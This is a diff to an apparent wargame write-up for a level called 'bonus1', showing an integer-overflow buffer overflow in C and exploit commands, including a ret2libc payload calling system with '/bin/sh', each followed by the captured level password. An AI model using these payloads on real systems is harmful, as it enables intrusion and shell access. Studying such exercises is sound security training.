@@ -14,7 +14,8 @@ Let's take a look at the source code:
 
 int main(int argc, char **argv)
 {
-    int ret; // Can't use size_t directly because of the if condition optimization
+    int ret;
+
     char buf[40];
 
     ret = atoi(argv[1]);
@@ -93,14 +94,14 @@ As mentionned above, we can write over the `ret` variable with the following:
 ```bash
 number + padding + value of ret
 
--2147483637 + 40 * A + 0x574f4c46
+-2147483637 + "\x90" * 40 + 0x574f4c46
 ```
 
 Indeed since `-2147483638` allows us to write 44 bytes to the buffer, we can write 40 bytes of padding and then the value of `ret` so that the `if` condition is satisfied.
 
 Let's try it:
 ```bash
-./bonus1 -2147483637 `python -c 'print "A"*40 + "\x57\x4f\x4c\x46"[::-1]'`
+./bonus1 -2147483637 `python -c 'print "\x90"*40 + "\x57\x4f\x4c\x46"[::-1]'`
 $ cat /home/user/bonus2/.pass
 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
 ```
@@ -171,12 +172,12 @@ Alright, let's craft our payload:
 ```
 number + padding + address of system + address of exit + address of "/bin/sh"
 
--2147483631 + 56 * A  + "\xb7\xe6\xb0\x60" + "\xb7\xe5\xeb\xe0" + "\xb7\xf8\xcc\x58"
+-2147483631 + "\x90" * 56  + "\xb7\xe6\xb0\x60" + "\xb7\xe5\xeb\xe0" + "\xb7\xf8\xcc\x58"
 ```
 
 Let's run it:
 ```bash
-./bonus1 -2147483631 `python -c 'print("A"*56 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'`
+./bonus1 -2147483631 `python -c 'print("\x90"*56 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'`
 $ cat /home/user/bonus2/.pass
 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
 ```
